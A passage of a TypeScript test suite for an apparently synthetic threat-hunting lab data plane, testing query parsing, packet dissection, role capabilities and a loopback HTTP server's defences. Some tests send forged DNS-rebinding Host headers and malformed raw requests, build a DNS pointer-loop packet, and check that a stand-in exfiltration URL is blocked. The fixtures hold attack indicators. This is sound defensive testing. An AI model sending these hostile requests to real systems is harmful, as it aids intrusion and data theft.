      { "@timestamp": "2026-11-14T10:01:00Z", event: { id: "evt-ws" }, host: { name: "WS-01" } },
      { "@timestamp": "2026-11-14T10:02:00Z", event: { id: "evt-dc" }, host: { name: "DC-01" } },
      { "@timestamp": "2026-11-14T10:03:00Z", event: { id: "evt-nohost" } },
      { "@timestamp": "2026-11-14T09:59:59Z", event: { id: "evt-before" }, host: { name: "WS-01" } },
    ].map((event) => JSON.stringify(event)).join("\n") + "\n");
    const allIds = ["evt-ws", "evt-dc", "evt-nohost", "evt-before"];
    for (const hosts of [["WS-01"], ["WS-01", "DC-01"], [], undefined]) {
      fs.writeFileSync(path.join(scopedDir, "case.json"), JSON.stringify({
        case_id: "citation-host-case",
        data_origin: "synthetic",
        hosts,
        time_range_utc: {
          start_inclusive: "2026-11-14T10:00:00Z",
          end_exclusive: "2026-11-14T11:00:00Z",
        },
      }));
      const expected = hosts?.length ? allIds.slice(0, hosts.length) : allIds.slice(0, 3);
      for (const warm of [false, true]) {
        const dp = EmbeddedHuntDataPlane.openSync(scopedDir, { cacheDir });
        try {
          expect(dp.cacheHit).toBe(warm);
          expect(dp.elasticSearch({}).hits.map((hit) => hit["event.id"])).toEqual(expected);
          const citations = dp.verifyCitations(allIds);
          expect(citations.resolved.eventIds).toEqual(expected);
          expect(citations.unresolved).toEqual(allIds.filter((id) => !expected.includes(id)));
        } finally {
          await dp.close();
        }
      }
    }
  });

  test("enforces closure-bound HMAC-SHA256 RoleCapabilityMint, ROLE_TOOL_OWNERSHIP (403), 405 read_only, and wire secret scrubbing", async () => {
    const dp = await EmbeddedHuntDataPlane.open(caseDir, { cacheDir });
    try {
      const mint = createRoleCapabilityMint();
      // Secret key must NEVER be exposed on any property of the mint or token
      expect(Object.keys(mint).sort()).toEqual([
        "bindDataPlane",
        "issueCapability",
        "verifyCapability",
      ]);

      const researcherTok = mint.issueCapability({
        huntId: "hunt-cap-1",
        caseId: "synth-case-001",
        profile: "framework-researcher",
        stepId: "evidence",
      });
      expect(Object.isFrozen(researcherTok)).toBe(true);

      // Forged HMAC signature -> 403 unauthorized_instance
      const forged = {
        ...researcherTok,
        profile: "framework-librarian" as const,
      };
      expect(() => mint.bindDataPlane(dp, forged)).toThrow(/unauthorized_instance|Forged/);

      // Wrong case binding -> 403 unauthorized_instance
      try {
        mint.verifyCapability(researcherTok, "other-case-002");
        throw new Error("Expected unauthorized_instance");
      } catch (err) {
        expect(extractDataPlaneError(err)?.statusCode).toBe(403);
        expect(extractDataPlaneError(err)?.errorCode).toBe("unauthorized_instance");
      }

      const researcherPlane = mint.bindDataPlane(dp, researcherTok);

      // Mutating HTTP verb -> 405 read_only
      await expect(
        researcherPlane.executeTool("elastic_search", { q: "" }, { method: "POST" }),
      ).rejects.toThrow(DataPlaneAccessError);

      // Tool not owned by framework-researcher -> 403 tool_not_owned
      await expect(
        researcherPlane.executeTool("intel_lookup", { values: "198.51.100.42" }),
      ).rejects.toThrow(/does not own tool/);

      // Coordinator during `scope` step owns 0 tools -> 403 tool_not_owned
      const scopeCoordinator = mint.bindDataPlane(
        dp,
        mint.issueCapability({
          huntId: "hunt-cap-1",
          caseId: "synth-case-001",
          profile: "framework-coordinator",
          stepId: "scope",
        }),
      );
      await expect(
        scopeCoordinator.executeTool("elastic_search", { q: "" }),
      ).rejects.toThrow(/does not own tool/);

      // Researcher running elastic_search with string size "10" coerces cleanly AND scrubs leaked credentials on wire!
      const wire = await researcherPlane.executeTool("elastic_search", {
        case_id: "synth-case-001",
        q: "event.code:1",
        size: "10",
        fields: "message,user.name",
      });
      const fenced = /^<untrusted_tool_result_([0-9a-f]{32})>\n([\s\S]*)\n<\/untrusted_tool_result_\1>$/.exec(wire);
      expect(fenced).not.toBeNull();
      const res = JSON.parse(fenced![2]!) as { returned: number; hits: Array<Record<string, unknown>> };
      expect(res.returned).toBe(1);
      const msg = String(res.hits[0]!.message);
      expect(msg).not.toContain("secret_event_jwt_token");
      expect(msg).not.toContain("SyntheticEventPat1234");
    } finally {
      await dp.close();
    }
  });

  test("compiles full Lucene query_string AST, enforces LEADING_WILDCARD 400, nanosecond cursors, /es/aggs, /es/detect, /intel & verifyCitations", async () => {
    const dp = await EmbeddedHuntDataPlane.open(caseDir, { cacheDir });
    try {
      // Warm cache hit check
      expect(dp.cacheHit).toBe(true);

      // 1. Out-of-window event excluded; nanosecond tie-break ordering exact (`evt-00001` before `evt-00002`)
      const page1 = dp.elasticSearch({ q: "", size: "2", sort: "asc" });
      expect(page1.total).toBe(3);
      expect(page1.hits.map((h) => h["event.id"])).toEqual(["evt-00001", "evt-00002"]);
      expect(page1.next_after).not.toBeNull();

      const page2 = dp.elasticSearch({
        q: "",
        size: 2,
        sort: "asc",
        after: page1.next_after!,
      });
      expect(page2.hits.map((h) => h["event.id"])).toEqual(["evt-00003"]);
      expect(page2.next_after).toBeNull();

      // 2. Pure negative clause (`NOT user.name:SYSTEM`)
      const nonSys = dp.elasticSearch({ q: "NOT user.name:SYSTEM" });
      expect(nonSys.hits.map((h) => h["event.id"])).toEqual(["evt-00001", "evt-00002"]);

      // 3. Field groups + boolean precedence (`event.code:(1 OR 3) AND host.name:WS-01`)
      const grouped = dp.elasticSearch({ q: "event.code:(1 OR 3) AND host.name:WS-01" });
      expect(grouped.total).toBe(2);

      // 4. Multi-value ECS array + dynamic labels.* + dns.answers.*
      expect(dp.elasticSearch({ q: "event.category:execution" }).total).toBe(1);
      expect(dp.elasticSearch({ q: "labels.env:prod" }).total).toBe(1);
      expect(dp.elasticSearch({ q: "dns.answers.data:exfil_chunk_01" }).total).toBe(1);

      // 5. Case-sensitive keyword GLOB vs Windows backslash path escape
      expect(dp.elasticSearch({ q: "user.name:ali?e" }).total).toBe(2);
      expect(dp.elasticSearch({ q: "user.name:ALI?E" }).total).toBe(0);
      expect(
        dp.elasticSearch({
          q: "process.executable:C\\:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\*",
        }).total,
      ).toBe(1);

      // 6. Numeric range (including unbounded `[100 TO *]`), _exists_, IPv4 CIDR & IPv6 CIDR (via 16-byte BLOB(16) event_ips)
      expect(dp.elasticSearch({ q: "destination.port:[400 TO 500]" }).total).toBe(2);
      expect(dp.elasticSearch({ q: "destination.port:[100 TO *]" }).total).toBe(2);
      expect(dp.elasticSearch({ q: "_exists_:powershell.file.script_block_text" }).total).toBe(1);
      expect(dp.elasticSearch({ q: "destination.ip:198.51.100.0/24" }).total).toBe(1);
      expect(dp.elasticSearch({ q: 'host.ip:"2001:db8:abcd::/48"' }).total).toBe(1);

      // 7. ignore_above: 1024 on standard keyword fields vs 8192 + .text FTS5 on LONG_KEYWORD_FIELDS
      expect(dp.elasticSearch({ q: "_exists_:labels.custom_long" }).total).toBe(0);
      expect(dp.elasticSearch({ q: "process.command_line.text:Invoke-Mimikatz" }).total).toBe(1);
      expect(dp.elasticSearch({ q: "powershell.file.script_block_text:DownloadString" }).total).toBe(1);
      expect(dp.elasticSearch({ q: "Invoke-Mimikatz" }).total).toBe(1); // Unqualified QUERY_FIELDS FTS

      // 8. Leading wildcards (`*shell.exe`, bare `*`) rejected with 400 leading_wildcard_not_supported
      for (const badQ of ["process.name:*shell.exe", "*"]) {
        try {
          dp.elasticSearch({ q: badQ });
          throw new Error(`Expected leading_wildcard_not_supported for ${badQ}`);
        } catch (err) {
          const dpErr = extractDataPlaneError(err);
          expect(dpErr?.statusCode).toBe(400);
          expect(dpErr?.errorCode).toBe("leading_wildcard_not_supported");
        }
      }

      // 9. /es/aggs terms (top_hits sample_event_id + other) & @timestamp histogram
      const termsAgg = dp.elasticAggregate({ field: "host.name", size: "1" });
      expect(termsAgg.total).toBe(3);
      expect(termsAgg.buckets[0]).toEqual({
        key: "WS-01",
        count: 2,
        sample_event_id: "evt-00001",
      });
      expect(termsAgg.other).toBe(1);

      const histAgg = dp.elasticAggregate({ field: "@timestamp", interval: "5m" });
      expect(histAgg.buckets.length).toBeGreaterThanOrEqual(2);
      expect(histAgg.buckets[0]!.sample_event_id).toBe("evt-00001");

      // 10. /es/detect
      const det = dp.detectionTest({
        name: "suspicious_ps_and_dns",
        q: "host.name:WS-01",
      });
      expect(det.total).toBe(2);
      expect(det.hosts).toEqual([{ key: "WS-01", count: 2 }]);
      expect(det.first).toBe("2026-11-14T10:05:00.000000001Z");

      // 11. /intel: case-insensitive match, deterministic sort `(indicator.value, threat.feed.name)`, preserves caller casing in `unmatched`
      const intelRes = dp.intelLookup({
        values: "C2.EVIL-TUNNEL.TEST, 198.51.100.42, Unknown.MixedCase.Domain",
      });
      expect(intelRes.matches.map((m) => [m["indicator.value"], m["threat.feed.name"]])).toEqual([
        ["198.51.100.42", "AlphaThreat"],
        ["c2.evil-tunnel.test", "AlphaThreat"],
        ["c2.evil-tunnel.test", "ZetaIntel"],
      ]);
      expect(intelRes.unmatched).toEqual(["Unknown.MixedCase.Domain"]);

      // 12. hunt_lab_query (`case`, unflattened `events`, `network`)
      const caseDoc = dp.huntLabQuery({ dataset: "case" }) as Record<string, unknown>;
      expect(caseDoc.case_id).toBe("synth-case-001");
      const rawEvents = dp.huntLabQuery({ dataset: "events", host: "WS-01" }) as {
        total: number;
        records: Array<Record<string, unknown>>;
      };
      expect(rawEvents.total).toBe(2);
      // Unflattened nested object check (`event.id` lives under `record.event.id`)
      expect((rawEvents.records[0]!.event as Record<string, unknown>).id).toBe("evt-00001");

      // 13. verifyCitations against loaded snapshot
      const verified = dp.verifyCitations([
        "evt-00001",
        "frame-0002",
        "ioc-00001",
        "evt-before-window", // out-of-window event -> must be unresolved!
        "frame-999", // nonexistent frame -> must be unresolved!
        "bad-cite",
      ]);
      expect(verified.allValid).toBe(false);
      expect(verified.resolved.eventIds).toEqual(["evt-00001"]);
      expect(verified.resolved.frameIds).toEqual(["frame-2"]);
      expect(verified.resolved.iocIds).toEqual(["ioc-00001"]);
      expect(verified.unresolved).toEqual(["evt-before-window", "frame-999"]);
      expect(verified.malformed).toEqual(["bad-cite"]);
    } finally {
      await dp.close();
    }
  });

  test("dissects streaming PCAP/pcapng: 1-based physical frame.number, 16KiB split TLS 1.3 FoxIO JA4 + SNI->http.host, 0xC0 loop-safe DNS, bare TCP, redactUri, NTLMSSP, SMB2, Kerberos & closed filter grammar", async () => {
    // Direct unit check on loop-guarded 0xC0 DNS pointer bomb, TXT RDATA dissector & redactUri
    expect(decompressDnsName(buildDnsPointerLoopPacket(), 12)).toBeNull();
    expect(redactUri("http://admin:hunter2@evil.test/api/v1?key=secret#frag")).toBe(
      "http://evil.test/api/v1?[redacted]",
    );
    const dissectedPkts: DissectedPacket[] = [];
    const directDissector = new PcapStreamDissector({
      caseId: "txt-check",
      onPacket: (p) => dissectedPkts.push(p),
    });
    directDissector.processRawFrame(
      1,
      1_763_114_460_000_000_000n,
      200,
      buildEthIpv4Header(
        [8, 8, 8, 8],
        [10, 20, 1, 5],
        17,
        buildUdpSegment(53, 53001, buildDnsCompressedTxtResponse()),
      ),
    );
    expect(dissectedPkts[0]!.kv.get("dns.cname")).toEqual(["cdn.evil-tunnel.test"]);
    expect(dissectedPkts[0]!.kv.get("dns.txt")).toEqual(["exfil_chunk_01"]);

    const dp = await EmbeddedHuntDataPlane.open(caseDir, { cacheDir });
    try {
      // 1. Frame 1 was pre-window -> first visible frame MUST be physical frame 2 (VLAN-tagged DNS 0xC0 TXT/CNAME)!
      const dnsFrames = dp.packetFields({
        filter: 'dns.qry.name == "data.evil-tunnel.test" && udp.srcport == 53',
        fields:
          "frame.number,dns.qry.name,dns.qry.type,dns.flags.rcode,dns.cname,_ws.col.Protocol",
      });
      expect(dnsFrames.returned).toBe(1);
      const f2Row = dnsFrames.rows[0]!;
      expect(f2Row["frame.number"]).toBe(2);
      expect(f2Row["dns.qry.type"]).toBe("16"); // numeric tshark code on packet_fields!
      expect(f2Row["dns.cname"]).toBe("cdn.evil-tunnel.test");

      // Whereas Arkime sessions stores DNS mnemonic ("TXT") in `dns.qt`!
      const dnsSess = dp.arkimeSessions({
        expression: 'host.dns == "data.evil-tunnel.test" && port.src == 53',
        fields: "dns.host,dns.qt",
      });
      expect(dnsSess.returned).toBe(1);
      expect(dnsSess.sessions[0]!["dns.qt"]).toEqual(["TXT"]);

      // 2. Reassembled split TLS 1.3 ClientHello (Frames 4 & 5) + ServerHello (Frame 6) -> Exact FoxIO JA4 + MD5 JA3/JA3S!
      const expectedJa4B = crypto
        .createHash("sha256")
        .update("1301,1302")
        .digest("hex")
        .slice(0, 12);
      const expectedJa4C = crypto
        .createHash("sha256")
        .update("000d,002b_0403,0804")
        .digest("hex")
        .slice(0, 12);
      const expectedJa4 = `t13d0204h2_${expectedJa4B}_${expectedJa4C}`;

      const tlsFrames = dp.packetFields({
        filter: 'tls.handshake.extensions_server_name == "c2.evil-tunnel.test"',
        fields:
          "frame.number,tls.handshake.extensions_server_name,tls.handshake.ja4,tls.handshake.ja3",
      });
      expect(tlsFrames.returned).toBe(1);
      expect(tlsFrames.rows[0]!["frame.number"]).toBe(5); // Completed on 2nd split TCP segment!
      expect(tlsFrames.rows[0]!["tls.handshake.ja4"]).toBe(expectedJa4);
      expect(String(tlsFrames.rows[0]!["tls.handshake.ja3"])).toMatch(/^[0-9a-f]{32}$/);

      const shFrames = dp.packetFields({
        filter: "ip.src == 198.51.100.42 && tcp.srcport == 443",
        fields: "frame.number,tls.handshake.ja3s,tls.record.version",
      });
      expect(shFrames.returned).toBe(1);
      expect(String(shFrames.rows[0]!["tls.handshake.ja3s"])).toMatch(/^[0-9a-f]{32}$/);

      // TLS SNI aliased into Arkime `http.host` (`host.http == "c2.evil-tunnel.test"` matches TLS session!)
      const sniViaHttpHost = dp.arkimeSessions({
        expression: 'host.http == "c2.evil-tunnel.test"',
        fields: "http.host,tls.ja4,tls.version,tls.cipher",
      });
      expect(sniViaHttpHost.returned).toBe(1);
      expect(sniViaHttpHost.sessions[0]!["tls.ja4"]).toEqual([expectedJa4]);
      expect(sniViaHttpHost.sessions[0]!["tls.version"]).toEqual(["TLSv1.3"]);

      const uniqueJa4 = dp.arkimeUnique({ field: "tls.ja4", counts: "1" });
      expect(uniqueJa4.values).toEqual([{ value: expectedJa4, count: 1 }]);

      // 3. Bare payload-free TCP SYN on port 445 -> `_ws.col.Protocol === "TCP"`, NOT `"SMB2"`!
      const bareSyn = dp.packetFields({
        filter: "ip.dst == 10.20.1.99 && tcp.dstport == 445",
        fields: "frame.number,_ws.col.Protocol",
      });
      expect(bareSyn.returned).toBe(1);
      expect(bareSyn.rows[0]!["_ws.col.Protocol"]).toBe("TCP");

      // 4. HTTP redactUri + NTLMSSP Type 3 username/domain extraction
      const httpRows = dp.packetFields({
        filter: 'http.host == "files.corp.test"',
        fields:
          "frame.number,http.request.uri,ntlmssp.auth.username,ntlmssp.auth.domain",
      });
      expect(httpRows.returned).toBe(1);
      expect(httpRows.rows[0]!["http.request.uri"]).toBe(
        "http://files.corp.test/share/report.docx?[redacted]",
      );
      expect(httpRows.rows[0]!["ntlmssp.auth.username"]).toBe("alice");
      expect(httpRows.rows[0]!["ntlmssp.auth.domain"]).toBe("CORP");

      // 5. Coalesced SMB2 TREE_CONNECT + CREATE
      const smbRows = dp.packetFields({
        filter: 'smb2.filename == "svcctl"',
        fields: "frame.number,smb2.cmd,smb2.tree,smb2.filename",
      });
      expect(smbRows.returned).toBe(1);
      expect(smbRows.rows[0]!["smb2.tree"]).toBe("\\\\DC01\\IPC$");
      expect(smbRows.rows[0]!["smb2.filename"]).toBe("svcctl");
      expect(smbRows.rows[0]!["smb2.cmd"]).toBe("3,5");

      // 6. Kerberos AS-REQ CNameString
      const krbRows = dp.packetFields({
        filter: 'kerberos.CNameString == "svc_backup"',
        fields: "frame.number,kerberos.CNameString,_ws.col.Protocol",
      });
      expect(krbRows.returned).toBe(1);
      expect(krbRows.rows[0]!["_ws.col.Protocol"]).toBe("KRB5");

      // 7. Closed packet_fields filter grammar strictly rejects forbidden fields/operators/escapes with 400 invalid_filter
      const forbiddenFilters = [
        'http.request.uri == "/login"',
        '_ws.col.Protocol == "DNS"',
        'dns.qry.name contains "evil"',
        'dns.qry.name matches "evil.*"',
        "tcp.dstport in {80 443}",
        'smb2.tree == "\\\\DC01\\IPC$"', // backslashes inside filter string forbidden by closed grammar
      ];
      for (const bad of forbiddenFilters) {
        try {
          dp.packetFields({ filter: bad });
          throw new Error(`Expected invalid_filter for ${bad}`);
        } catch (err) {
          const dpErr = extractDataPlaneError(err);
          expect(dpErr?.statusCode).toBe(400);
          expect(dpErr?.errorCode).toBe("invalid_filter");
        }
      }
    } finally {
      await dp.close();
    }

    // 8. Verify `.pcapng` container support via Worker indexer too!
    const pcapngDir = path.join(tmpRoot, "pcapng-case-001");
    fs.mkdirSync(pcapngDir, { recursive: true });
    fs.writeFileSync(
      path.join(pcapngDir, "case.json"),
      JSON.stringify({
        case_id: "pcapng-case-001",
        data_origin: "synthetic",
        question: "Verify pcapng indexing",
        time_range_utc: {
          start_inclusive: "2026-11-14T10:00:00Z",
          end_exclusive: "2026-11-14T11:00:00Z",
        },
      }),
    );
    fs.writeFileSync(
      path.join(pcapngDir, "events.jsonl"),
      `${JSON.stringify({
        "@timestamp": "2026-11-14T10:01:00Z",
        event: { id: "evt-ng-1" },
        host: { name: "NG-1" },
        message: "ok",
      })}\n`,
    );
    const tsUs = BigInt(Date.parse("2026-11-14T10:02:00Z")) * 1_000n;
    const ngFrame = buildEthIpv4Header(
      [10, 0, 0, 2],
      [8, 8, 4, 4],
      17,
      buildUdpSegment(53, 55000, buildDnsCompressedTxtResponse()),
    );
    fs.writeFileSync(path.join(pcapngDir, "traffic.pcapng"), buildPcapngFile([{ tsUs, data: ngFrame }]));

    const ngPlane = await EmbeddedHuntDataPlane.open(pcapngDir, { cacheDir });
    try {
      expect(ngPlane.hasNetworkCapture).toBe(true);
      const rows = ngPlane.packetFields({ fields: "frame.number,dns.qry.name,dns.cname" });
      expect(rows.returned).toBe(1);
      expect(rows.rows[0]!["dns.cname"]).toBe("cdn.evil-tunnel.test");
    } finally {
      await ngPlane.close();
    }
  });

  test("serves local loopback HTTP server with DNS-rebinding Host check (403), secret check (401), 405 read_only, HTML Watch views & decideWatchRequest", async () => {
    const dp = await EmbeddedHuntDataPlane.open(caseDir, { cacheDir });
    try {
      const srv = await dp.ensureLocalHttpServer();

      const rawGet = (
        routePath: string,
        headers: Record<string, string>,
        method = "GET",
      ): Promise<{ status: number; headers: http.IncomingHttpHeaders; body: string }> =>
        new Promise((resolve, reject) => {
          const req = http.request(
            {
              hostname: "127.0.0.1",
              port: srv.port,
              path: routePath,
              method,
              agent: false,
              headers,
            },
            (res) => {
              const chunks: Buffer[] = [];
              res.on("data", (c: Buffer) => chunks.push(c));
              res.on("end", () =>
                resolve({
                  status: res.statusCode ?? 0,
                  headers: res.headers,
                  body: Buffer.concat(chunks).toString("utf8"),
                }),
              );
            },
          );
          req.on("error", reject);
          req.end();
        });

      // 1. Forged Host header (DNS rebinding attempt) -> 403 host_not_allowed BEFORE checking secret!
      const rebind = await rawGet("/health", {
        Host: "evil-rebind.attacker.test",
        "X-Hunt-Lab-Secret": srv.secret,
      });
      expect(rebind.status).toBe(403);
      expect(JSON.parse(rebind.body)).toEqual({ error: "host_not_allowed" });

      // 2. Missing or wrong X-Hunt-Lab-Secret -> 401 caller_not_authorized
      const unauth = await rawGet("/health", {
        Host: `127.0.0.1:${srv.port}`,
        "X-Hunt-Lab-Secret": "0".repeat(64),
      });
      expect(unauth.status).toBe(401);
      expect(JSON.parse(unauth.body)).toEqual({ error: "caller_not_authorized" });

      // 3. POST request -> 405 read_only
      const postRes = await rawGet(
        "/es/search",
        {
          Host: `127.0.0.1:${srv.port}`,
          "X-Hunt-Lab-Secret": srv.secret,
        },
        "POST",
      );
      expect(postRes.status).toBe(405);
      expect(JSON.parse(postRes.body)).toEqual({ error: "read_only" });

      // 4. Valid GET /health & /es/search & /watch/kibana_discover HTML view
      const health = await rawGet("/health", {
        Host: `127.0.0.1:${srv.port}`,
        "X-Hunt-Lab-Secret": srv.secret,
      });
      expect(health.status).toBe(200);
      expect(health.headers["x-hunt-lab-instance"]).toBe(srv.instanceId);
      const healthObj = JSON.parse(health.body) as Record<string, unknown>;
      expect(healthObj.ready).toBe(true);
      expect(healthObj.event_count).toBe(3);

      const watch = await dp.labBrowser({ page: "kibana_discover", q: "host.name:WS-01" });
      const watchUrl = new URL(watch.url);
      const watchHtml = await rawGet(`${watchUrl.pathname}${watchUrl.search}`, {
        Host: `127.0.0.1:${srv.port}`,
      });
      expect(watchHtml.status).toBe(200);
      expect(watchHtml.headers["content-type"]).toContain("text/html");
      expect(watchHtml.body).toContain("evt-00001");

      // In-process labBrowser Watch pages (zero Docker!)
      for (const page of [
        "lab_console",
        "kibana_discover",
        "arkime_sessions",
        "arkime_spiview",
      ] as const) {
        const res = await dp.labBrowser({ page, field: "tls.ja4" });
        expect(res.case_id).toBe("synth-case-001");
        expect(res.blocked_requests).toBe(0);
        const opened = await fetch(res.url, { proxy: "", redirect: "error" });
        expect(opened.status).toBe(200);
        expect(opened.headers.get("content-type")).toContain("text/html");
        const html = await opened.text();
        expect(html).toContain(res.title);
        const withoutKey = new URL(res.url);
        withoutKey.searchParams.delete("key");
        const refused = await fetch(withoutKey, { proxy: "", redirect: "error" });
        expect(refused.status).toBe(401);
      }

      const filtered = await dp.labBrowser({ page: "kibana_discover", q: "host.name:DC-01" });
      const filteredPage = await fetch(filtered.url, { proxy: "", redirect: "error" });
      const filteredHtml = await filteredPage.text();
      expect(filteredHtml).toContain("evt-00003");
      expect(filteredHtml).not.toContain("evt-00001");

      const networkPlane = createRoleCapabilityMint();
      const network = networkPlane.bindDataPlane(dp, networkPlane.issueCapability({
        huntId: "hunt-watch-boundary",
        caseId: dp.caseId,
        profile: "framework-network-analyst",
      }));
      await expect(network.executeTool("elastic_search", {})).rejects.toThrow(/does not own tool/);
      await expect(network.executeTool("intel_lookup", { values: "example.test" })).rejects.toThrow(/does not own tool/);
      await expect(network.executeTool("lab_browser", { page: "lab_console" })).rejects.toThrow(/does not own tool/);
      await expect(network.executeTool("lab_browser", { page: "kibana_discover" })).rejects.toThrow(/does not own tool/);
      const wire = await network.executeTool("lab_browser", { page: "arkime_sessions" });
      expect(wire.includes(srv.secret)).toBe(false);
      const fence = /^<untrusted_tool_result_([0-9a-f]{32})>\n([\s\S]*)\n<\/untrusted_tool_result_\1>$/.exec(wire);
      expect(fence).not.toBeNull();
      const result = JSON.parse(fence![2]!) as { url: string };
      const key = new URL(result.url).searchParams.get("key")!;
      expect(key.length).toBe(64);
      expect(key === srv.secret).toBe(false);
      for (const route of ["/case", "/health", "/activity", "/es/search", "/intel?values=example.test"]) {
        const asHeader = await rawGet(route, {
          Host: `127.0.0.1:${srv.port}`,
          "X-Hunt-Lab-Secret": key,
        });
        expect(asHeader.status).toBe(401);
        const asQuery = await rawGet(`${route}${route.includes("?") ? "&" : "?"}key=${key}`, {
          Host: `127.0.0.1:${srv.port}`,
        });
        expect(asQuery.status).toBe(401);
      }
      const watchAsHeader = await rawGet("/view", {
        Host: `127.0.0.1:${srv.port}`,
        "X-Hunt-Lab-Secret": key,
      });
      expect(watchAsHeader.status).toBe(401);

      const networkUrl = new URL(result.url);
      const allowedNetwork = await rawGet(`${networkUrl.pathname}${networkUrl.search}`, {
        Host: `127.0.0.1:${srv.port}`,
      });
      expect(allowedNetwork.status).toBe(200);
      for (const route of ["/", "/view", "/watch/kibana_discover", "/watch/arkime_spiview"]) {
        const refused = await rawGet(`${route}?key=${key}`, { Host: `127.0.0.1:${srv.port}` });
        expect(refused.status).toBe(401);
      }

      const researcherToken = { ...networkPlane.issueCapability({
        huntId: "hunt-watch-researcher",
        caseId: dp.caseId,
        profile: "framework-researcher",
      }) };
      const researcher = networkPlane.bindDataPlane(dp, researcherToken);
      await expect(researcher.executeTool("lab_browser", { page: "arkime_sessions" })).rejects.toThrow(/does not own tool/);
      await expect(researcher.executeTool("lab_browser", { page: "arkime_spiview" })).rejects.toThrow(/does not own tool/);
      const eventWire = await researcher.executeTool("lab_browser", { page: "kibana_discover" });
      const eventFence = /^<untrusted_tool_result_([0-9a-f]{32})>\n([\s\S]*)\n<\/untrusted_tool_result_\1>$/.exec(eventWire);
      const eventResult = JSON.parse(eventFence![2]!) as { url: string };
      const eventUrl = new URL(eventResult.url);
      const eventPage = await rawGet(`${eventUrl.pathname}${eventUrl.search}`, {
        Host: `127.0.0.1:${srv.port}`,
      });
      expect(eventPage.status).toBe(200);
      expect(eventPage.body).toContain("evt-00001");
      expect(eventPage.body).not.toContain("secret_event_jwt_token");
      expect(eventPage.body).not.toContain("SyntheticEventPat1234");
      expect(eventPage.body).toMatch(/&lt;untrusted_tool_result_[0-9a-f]{32}&gt;/);
      expect(eventPage.body).toMatch(/&lt;\/untrusted_tool_result_[0-9a-f]{32}&gt;/);
      const swapped = await rawGet(`/watch/arkime_sessions?key=${eventUrl.searchParams.get("key")}`, {
        Host: `127.0.0.1:${srv.port}`,
      });
      expect(swapped.status).toBe(401);
      researcherToken.profile = "framework-network-analyst";
      const revoked = await rawGet(`${eventUrl.pathname}${eventUrl.search}`, {
        Host: `127.0.0.1:${srv.port}`,
      });
      expect(revoked.status).toBe(403);

      // 5. decideWatchRequest policy checks
      const scope = {
        caseId: "synth-case-001",
        labOrigin: `http://127.0.0.1:${srv.port}`,
        arkimeOrigin: "http://127.0.0.1:8005",
        kibanaOrigin: "http://127.0.0.1:5601",
        startSec: 1_763_114_400,
        stopSec: 1_763_118_000,
      };
      expect(decideWatchRequest(scope, "GET", "https://evil.example/exfil").block).toBe(
        "origin_not_lab",
      );
      expect(
        decideWatchRequest(scope, "GET", "http://127.0.0.1:8005/api/pcap/download.pcap").block,
      ).toBe("arkime_route_denied");
      const rewritten = decideWatchRequest(
        scope,
        "GET",
        "http://127.0.0.1:8005/api/sessions?expression=ip.dst%3D%3D198.51.100.42&startTime=1",
      );
      expect(rewritten.block).toBeNull();
      expect(rewritten.expression).toBe(
        '(ip.dst==198.51.100.42) && tags == "case:synth-case-001"',
      );
      expect(rewritten.url).toContain(`startTime=${scope.startSec}`);
    } finally {
      await dp.close();
    }
  });

  test("regression (pr1-v3 BLOCK 1 & BLOCK 2): enforces Host->Secret->GET->origin-form order on raw sockets, isolates Watch grants, guards malformed % in decideWatchRequest, and scopes POST search bodies", async () => {
    const dp = await EmbeddedHuntDataPlane.open(caseDir, { cacheDir });
    try {
      const srv = await dp.ensureLocalHttpServer();

      const sendRawHttp = (
        rawWireRequest: string,
      ): Promise<{ statusLine: string; headersRaw: string; body: string }> =>
        new Promise((resolve, reject) => {
          const sock = net.connect(srv.port, "127.0.0.1", () => {
            sock.write(rawWireRequest);
          });
          const chunks: Buffer[] = [];
          sock.on("data", (c: Buffer) => chunks.push(c));
          sock.on("error", reject);
          sock.on("end", () => {
            const full = Buffer.concat(chunks).toString("utf8");
            const splitIdx = full.indexOf("\r\n\r\n");
            const head = splitIdx >= 0 ? full.slice(0, splitIdx) : full;
            const body = splitIdx >= 0 ? full.slice(splitIdx + 4) : "";
            const firstNl = head.indexOf("\r\n");
            const statusLine = firstNl >= 0 ? head.slice(0, firstNl) : head;
            resolve({ statusLine, headersRaw: head.toLowerCase(), body });
          });
        });

      // 1. Exact pr1-v3 BLOCK 1 live repro: `GET //% HTTP/1.1` with forged `Host: evil.attacker.test` (and NO secret!)
      // MUST return 403 host_not_allowed + X-Hunt-Lab-Instance (never 200 OK or uncaught TypeError!)
      const hostileRebind = await sendRawHttp(
        `GET //% HTTP/1.1\r\nHost: evil.attacker.test\r\nConnection: close\r\n\r\n`,
      );
      expect(hostileRebind.statusLine).toContain("403");
      expect(hostileRebind.headersRaw).toContain(`x-hunt-lab-instance: ${srv.instanceId}`);
      expect(JSON.parse(hostileRebind.body)).toEqual({ error: "host_not_allowed" });

      // 2. `GET //% HTTP/1.1` with valid `Host: 127.0.0.1:<port>` and NO secret -> 401 caller_not_authorized
      const hostileUnauth = await sendRawHttp(
        `GET //% HTTP/1.1\r\nHost: 127.0.0.1:${srv.port}\r\nConnection: close\r\n\r\n`,
      );
      expect(hostileUnauth.statusLine).toContain("401");
      expect(hostileUnauth.headersRaw).toContain(`x-hunt-lab-instance: ${srv.instanceId}`);
      expect(JSON.parse(hostileUnauth.body)).toEqual({ error: "caller_not_authorized" });

      // 3. `POST //% HTTP/1.1` with valid `Host` and valid `X-Hunt-Lab-Secret` -> 405 read_only BEFORE URL parse
      const hostilePost = await sendRawHttp(
        `POST //% HTTP/1.1\r\nHost: 127.0.0.1:${srv.port}\r\nX-Hunt-Lab-Secret: ${srv.secret}\r\nConnection: close\r\n\r\n`,
      );
      expect(hostilePost.statusLine).toContain("405");
      expect(JSON.parse(hostilePost.body)).toEqual({ error: "read_only" });

      // 4. Scheme-relative `//evil.com/...`, malformed `//%`, `\\` authority, and `#frag` with valid Host + Secret -> 400 invalid_request
      for (const badTarget of [
        "//evil.com/watch/kibana_discover",
        "//%",
        "/\\\\evil.com",
        "/health#fragment",
      ]) {
        const badReq = await sendRawHttp(
          `GET ${badTarget} HTTP/1.1\r\nHost: 127.0.0.1:${srv.port}\r\nX-Hunt-Lab-Secret: ${srv.secret}\r\nConnection: close\r\n\r\n`,
        );
        expect(badReq.statusLine).toContain("400");
        expect(JSON.parse(badReq.body)).toEqual({ error: "invalid_request" });
      }

      // 5. Watch grant isolation: labBrowser URL uses dedicated page-bound grant (not API `srv.secret`),
      // works on its `/watch/*` GET, returns 405 on POST, and CANNOT authenticate JSON `/es/search`!
      const watchPage = await dp.labBrowser({ page: "kibana_discover", q: "host.name:WS-01" });
